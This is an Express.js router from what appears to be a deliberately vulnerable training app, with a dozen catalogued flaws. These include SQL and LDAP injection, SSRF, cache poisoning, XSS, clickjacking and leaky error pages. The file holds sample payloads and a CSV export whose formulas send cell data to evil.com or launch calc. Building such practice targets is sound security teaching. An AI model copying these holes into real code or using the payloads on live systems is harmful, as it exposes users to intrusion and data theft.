// =====================================================================
// VULN-107  HTTP REQUEST SMUGGLING SIMULATION
// CWE-444  |  OWASP A05:2021  |  CVSS 8.1 (High)
// Endpoint reflete Content-Length e Transfer-Encoding sem normalização,
// simulando condição para request smuggling CL.TE ou TE.CL.
//
// VULN-108  CACHE POISONING SIMULATION
// CWE-349  |  OWASP A05:2021  |  CVSS 7.5 (High)
// Resposta inclui conteúdo dinâmico (X-Forwarded-Host) em cacheable page.
//
// VULN-109  LDAP INJECTION SIMULATION
// CWE-90  |  OWASP A03:2021  |  CVSS 7.5 (High)
// GET /api/ldap/search?user= concatena input em "LDAP filter" simulado.
//
// VULN-110  INTEGER OVERFLOW / UNDERFLOW
// CWE-190  |  OWASP A04:2021  |  CVSS 7.5 (High)
// POST /api/calc com valores extremos causa overflow em parseInt.
//
// VULN-111  SECOND-ORDER SQL INJECTION
// CWE-89  |  OWASP A03:2021  |  CVSS 9.1 (Critical)
// POST /api/profiles salva payload SQLi no campo "bio". GET /api/profiles/export
// usa o bio salvo em nova query sem escapar.
//
// VULN-112  BLIND SSRF VIA WEBHOOK
// CWE-918  |  OWASP A10:2021  |  CVSS 7.5 (High)
// POST /api/webhooks registra URL que será chamada (sem validação).
//
// VULN-113  INSECURE RANDOM (Math.random para tokens)
// CWE-330  |  OWASP A02:2021  |  CVSS 5.3 (Medium)
//
// VULN-114  WEBSOCKET INJECTION SIMULATION
// CWE-79  |  OWASP A03:2021  |  CVSS 6.1 (Medium)
// GET /api/ws/simulate — mensagens do "websocket" não sanitizadas.
//
// VULN-115  MASS IMPORT / CSV INJECTION
// CWE-1236  |  OWASP A03:2021  |  CVSS 7.5 (High)
// GET /api/export/csv retorna dados com formulas Excel injetadas.
//
// VULN-116  CLICKJACKING (frameable endpoint com form)
// CWE-1021  |  OWASP A05:2021  |  CVSS 6.1 (Medium)
//
// VULN-117  UNVALIDATED FORWARD / INCLUDE
// CWE-441  |  OWASP A10:2021  |  CVSS 7.5 (High)
// GET /api/proxy/internal?endpoint= faz request interno sem filtro.
//
// VULN-118  SENSITIVE DATA IN ERROR PAGES (custom 404/500)
// CWE-209  |  OWASP A05:2021  |  CVSS 5.3 (Medium)
// =====================================================================
const express = require('express');
const axios = require('axios');
const db = require('../db');
const router = express.Router();

// VULN-107: HTTP Request Smuggling simulation
router.all('/smuggle', (req, res) => {
  const cl = req.headers['content-length'];
  const te = req.headers['transfer-encoding'];
  res.json({
    method: req.method,
    content_length: cl,
    transfer_encoding: te,
    body_received: typeof req.body === 'string' ? req.body : JSON.stringify(req.body),
    headers: req.headers,
    _vuln: 'Server reflects both CL and TE headers. In a multi-tier setup (proxy+backend), sending both can cause request smuggling.',
    _exploit: 'Send: Transfer-Encoding: chunked AND Content-Length: X with conflicting body sizes'
  });
});

// VULN-108: Cache Poisoning
router.get('/cacheable', (req, res) => {
  const forwardedHost = req.headers['x-forwarded-host'] || req.headers.host;
  // Resposta "cacheável" que inclui conteúdo dinâmico controlado pelo atacante
  res.setHeader('Cache-Control', 'public, max-age=3600');
  res.setHeader('X-Cache', 'HIT');
  res.setHeader('Content-Type', 'text/html');
  res.send(`<!doctype html><html><head>
<base href="http://${forwardedHost}/">
<script src="http://${forwardedHost}/static/app.js"></script>
</head><body>
<h1>Welcome to VulnHub</h1>
<p>This page is cached and includes X-Forwarded-Host in HTML output.</p>
<p>Poison cache with: X-Forwarded-Host: evil.com</p>
</body></html>`);
});

// VULN-109: LDAP Injection simulation
router.get('/ldap/search', (req, res) => {
  const user = req.query.user || '';
  // Simula filtro LDAP sem sanitização
  const ldapFilter = `(&(objectClass=person)(uid=${user}))`;
  // Se contém )(, é injection
  const injected = user.includes(')(') || user.includes('*');
  res.json({
    ldap_filter: ldapFilter,
    injection_detected: injected,
    results: injected
      ? [{ dn: 'cn=admin,dc=cyberdyne', uid: 'admin', role: 'superadmin', password: 'admin123' },
         { dn: 'cn=john,dc=cyberdyne', uid: 'john.connor', role: 'admin', password: 'skynet_must_die' }]
      : [{ dn: `cn=${user},dc=cyberdyne`, uid: user }],
    _vuln: 'LDAP injection: try user=*)(|(uid=*) to enumerate, or user=admin)(|(password=*) to leak'
  });
});

// VULN-110: Integer overflow
router.post('/calc', (req, res) => {
  const { a, b, operation } = req.body || {};
  const numA = parseInt(a);
  const numB = parseInt(b);
  let result;
  switch (operation) {
    case 'add': result = numA + numB; break;
    case 'multiply': result = numA * numB; break;
    case 'subtract': result = numA - numB; break;
    case 'divide': result = numA / numB; break;  // CWE-369: divide by zero possível
    default: result = NaN;
  }
  // Em JS Number é float64, mas parseInt trunca. Demonstra comportamento inesperado.
  res.json({
    a: numA, b: numB, operation, result,
    is_safe: Number.isSafeInteger(result),
    _vuln: 'Try: a=9999999999999999, b=9999999999999999, operation=multiply (precision loss). Or b=0, operation=divide (Infinity)'
  });
});

// VULN-111: Second-order SQLi
const profiles = [];
router.post('/profiles', (req, res) => {
  const { username, bio } = req.body || {};
  // Salva o payload cru
  profiles.push({ username, bio });
  res.json({ ok: true, id: profiles.length, _vuln: 'Bio saved raw. Try bio: "\' OR 1=1--"' });
});

router.get('/profiles/export', (_req, res) => {
  // Usa bio em query SQL sem escapar → second-order SQLi
  const results = [];
  for (const p of profiles) {
    try {
      const sql = `SELECT id, username, email FROM users WHERE username = '${p.bio}'`;
      const rows = db.prepare(sql).all();
      results.push({ profile: p, query: sql, db_results: rows });
    } catch (e) {
      results.push({ profile: p, error: e.message });
    }
  }
  res.json({ profiles: results, _vuln: 'Second-order SQLi: bio stored in step 1 is used unsafely in step 2' });
});

// VULN-112: Blind SSRF via webhook
const webhooks = [];
router.post('/webhooks', async (req, res) => {
  const { url, event } = req.body || {};
  if (!url) return res.status(400).json({ error: 'url required' });
  webhooks.push({ url, event: event || 'any', created: Date.now() });

  // Faz request imediato para a URL (blind SSRF)
  try {
    const r = await axios.get(url, { timeout: 5000, validateStatus: () => true });
    res.json({ ok: true, webhook_url: url, response_status: r.status, _vuln: 'URL fetched server-side without validation' });
  } catch (e) {
    res.json({ ok: true, webhook_url: url, fetch_error: e.message, _vuln: 'Blind SSRF: error reveals internal network info' });
  }
});

router.get('/webhooks', (_req, res) => res.json(webhooks));

// VULN-113: Insecure random
router.get('/token/generate', (_req, res) => {
  // Math.random() não é criptograficamente seguro
  const token = Math.random().toString(36).slice(2) + Math.random().toString(36).slice(2);
  const resetCode = String(Math.floor(Math.random() * 10000)).padStart(4, '0');
  res.json({
    token,
    reset_code: resetCode,
    _vuln: 'Math.random() is predictable. Use crypto.randomBytes() instead.'
  });
});

// VULN-114: WebSocket injection simulation
router.get('/ws/simulate', (req, res) => {
  const message = req.query.msg || 'Hello';
  // Simula mensagem de WS renderizada sem sanitização
  res.setHeader('Content-Type', 'text/html');
  res.send(`<!doctype html><html><body>
<h3>WebSocket Chat Simulation</h3>
<div id="chat">
  <div class="msg"><b>System:</b> Connected to ws://vulnhub.local/ws</div>
  <div class="msg"><b>User:</b> ${message}</div>
  <div class="msg"><b>Bot:</b> Received your message.</div>
</div>
<p style="font-size:12px;color:#666">VULN-114: msg param injected into HTML without sanitization.
Try: ?msg=&lt;img src=x onerror=alert(1)&gt;</p>
</body></html>`);
});

// VULN-115: CSV Injection
router.get('/export/csv', (_req, res) => {
  res.setHeader('Content-Type', 'text/csv');
  res.setHeader('Content-Disposition', 'attachment; filename="users_export.csv"');
  const rows = db.prepare('SELECT id, username, email, balance FROM users').all();
  let csv = 'id,username,email,balance,notes\n';
  rows.forEach(r => {
    csv += `${r.id},${r.username},${r.email},${r.balance},=HYPERLINK("http://evil.com/?data="&A${r.id})\n`;
  });
  // Fórmulas Excel embutidas nos dados
  csv += `999,=CMD("|calc"),=HYPERLINK("http://evil.com"),0,"=1+1"\n`;
  res.send(csv);
});

// VULN-116: Clickjacking (frameable form)
router.get('/frameable', (_req, res) => {
  // Explicitamente NÃO define X-Frame-Options
  res.removeHeader('X-Frame-Options');
  res.setHeader('Content-Type', 'text/html');
  res.send(`<!doctype html><html><body>
<h2>Account Settings</h2>
<form action="/api/account/password" method="POST" style="display:inline">
<input name="user_id" value="1" type="hidden">
<input name="new_password" value="hacked123" type="hidden">
<button type="submit" style="padding:20px 40px;font-size:20px">Click here to win a prize!</button>
</form>
<p style="font-size:12px">VULN-116: This page has no X-Frame-Options. An attacker can iframe it and trick users into clicking.</p>
</body></html>`);
});

// VULN-117: Unvalidated forward
router.get('/proxy/internal', async (req, res) => {
  const endpoint = req.query.endpoint || '';
  if (!endpoint) return res.status(400).json({ error: 'endpoint param required' });
  // Faz forward interno sem validação — acessa qualquer rota
  try {
    const url = `http://localhost:${process.env.PORT || 3000}${endpoint}`;
    const r = await axios.get(url, { timeout: 5000, validateStatus: () => true });
    res.status(r.status).json({ proxied_url: url, status: r.status, data: r.data });
  } catch (e) {
    res.status(500).json({ error: e.message, proxied_endpoint: endpoint });
  }
});

// VULN-118: Sensitive data in error pages
router.get('/trigger-error', (_req, res) => {
  res.status(500).setHeader('Content-Type', 'text/html');
  res.send(`<!doctype html><html><body>
<h1>500 Internal Server Error</h1>
<h2>Debug Information</h2>
<pre>
Application: VulnHub API v0.1.0
Node.js: ${process.version}
Platform: ${process.platform}
Arch: ${process.arch}
PID: ${process.pid}
CWD: ${process.cwd()}
Memory: ${JSON.stringify(process.memoryUsage())}

Database: SQLite @ ${require('path').join(__dirname, '..', 'db', 'vulnhub.db')}
JWT_SECRET: secret123
ADMIN_PASSWORD: admin123
AWS_KEY: AKIAIOSFODNN7EXAMPLE

Stack Trace:
  at Server.handleError (server.js:50:5)
  at Router.handle (express/lib/router/index.js:301:5)
  at Object.module.exports (db/index.js:12:7)
</pre>
</body></html>`);
});

module.exports = router;
